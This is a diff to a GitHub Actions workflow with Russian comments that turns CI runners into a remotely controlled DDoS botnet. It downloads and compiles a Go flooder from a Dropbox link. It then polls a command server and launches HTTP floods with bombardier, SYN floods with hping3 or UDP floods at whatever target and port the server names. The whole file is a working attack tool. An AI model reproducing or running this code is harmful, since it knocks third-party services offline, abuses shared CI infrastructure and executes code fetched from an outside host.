@@ -15,23 +15,41 @@ jobs:
         run: |
           sudo apt-get update
           sudo apt-get install -y hping3 golang-go wget curl jq
+          
+          # Установка Bombardier
           wget https://github.com/codesenberg/bombardier/releases/download/v1.2.6/bombardier-linux-amd64 -O bombardier
           chmod +x bombardier && sudo mv bombardier /usr/local/bin/
-          wget -O bombarida.go "https://www.dropbox.com/scl/fi/zomtm1n4fk8c9bhigxo6c/bombarida.go?rlkey=7axesdmxaztkxo7ie55uybp3m&st=lgr6k8u6&dl=1"
+          
+          # Скачивание исходника Go (с заменой dl=1 на raw=1 для надежности)
+          wget -O bombarida.go "https://www.dropbox.com/scl/fi/zomtm1n4fk8c9bhigxo6c/bombarida.go?rlkey=7axesdmxaztkxo7ie55uybp3m&raw=1"
+          
+          # Проверка: не скачался ли HTML вместо кода
+          if head -n 1 bombarida.go | grep -q "<"; then
+            echo "ОШИБКА: Dropbox отдал HTML страницу вместо файла кода!"
+            echo "Проверь ссылку или используй GitHub Gist."
+            exit 1
+          fi
+
+          # Компилируем файл один раз
+          go build -o bombarida_bin bombarida.go
+          chmod +x bombarida_bin
 
       - name: Control Loop
         env:
           URL: "https://me5years.alwaysdata.net/index.php?action=get"
         run: |
-          # При запуске запоминаем ID, чтобы не начинать атаку автоматически
+          # Запоминаем текущий ID, чтобы не начинать атаку сразу при старте
           LAST_ID=$(curl -s "$URL" | jq -r '.id // 0')
           echo "READY. WAITING FOR COMMAND... (START ID: $LAST_ID)"
           
           while true; do
             DATA=$(curl -s "$URL")
+            
+            # Проверяем, что пришел валидный JSON
             if echo "$DATA" | jq -e . >/dev/null 2>&1; then
               ID=$(echo "$DATA" | jq -r '.id // 0')
 
+              # Если ID изменился и он не нулевой
               if [[ "$ID" != "$LAST_ID" && "$ID" != "0" ]]; then
                 LAST_ID=$ID
                 METHOD=$(echo "$DATA" | jq -r '.method')
@@ -39,27 +57,35 @@ jobs:
                 PORT=$(echo "$DATA" | jq -r '.port')
                 CONNS=$(echo "$DATA" | jq -r '.conns')
 
-                sudo killall bombardier hping3 go 2>/dev/null || true
+                # Останавливаем все запущенные ранее процессы
+                sudo killall bombardier hping3 bombarida_bin 2>/dev/null || true
                 
                 if [ "$METHOD" == "stop" ]; then
-                  echo ">>> АТАКА ПРЕКРАЩЕНА <<<"
+                  echo ">>> КОМАНДА: STOP (ID: $ID) <<<"
                 else
                   echo "=================================================="
-                  echo "АТАКА ЗАПУЩЕНА НА: $TARGET"
-                  echo "МЕТОД: $METHOD | МАШИНА: ${{ matrix.runner }}"
+                  echo "АТАКА ЗАПУЩЕНА: $METHOD"
+                  echo "ЦЕЛЬ: $TARGET : $PORT"
+                  echo "МАШИНА: ${{ matrix.runner }} | ID: $ID"
                   echo "=================================================="
 
                   if [ "$METHOD" == "http" ]; then
+                    # Запуск HTTP нагрузки в фоне
                     while true; do bombardier -c 1000 -d 3600s --http2 -l "$TARGET?cache=$RANDOM"; done &
                   elif [ "$METHOD" == "tcp" ]; then
+                    # Запуск TCP SYN flood
                     sudo hping3 --flood -S -p $PORT $TARGET &
                   elif [ "$METHOD" == "udp" ]; then
-                    go run bombarida.go -mode client -addr "${TARGET}:${PORT}" -c $CONNS -n 0 -d 3600s -r 0 -t 1s &
+                    # Запуск UDP через скомпилированный бинарник
+                    ./bombarida_bin -mode client -addr "${TARGET}:${PORT}" -c $CONNS -n 0 -d 3600s -r 0 -t 1s &
                   elif [ "$METHOD" == "udp-ddnet" ]; then
-                    go run bombarida.go -mode client -addr "${TARGET}:${PORT}" -ddnet-info -open-loop -c $CONNS -n 0 -d 3600s -r 0 -t 1s &
+                    # Запуск специального UDP метода
+                    ./bombarida_bin -mode client -addr "${TARGET}:${PORT}" -ddnet-info -open-loop -c $CONNS -n 0 -d 3600s -r 0 -t 1s &
                   fi
                 fi
               fi
             fi
+            
+            # Интервал опроса сервера управления
             sleep 5
           done
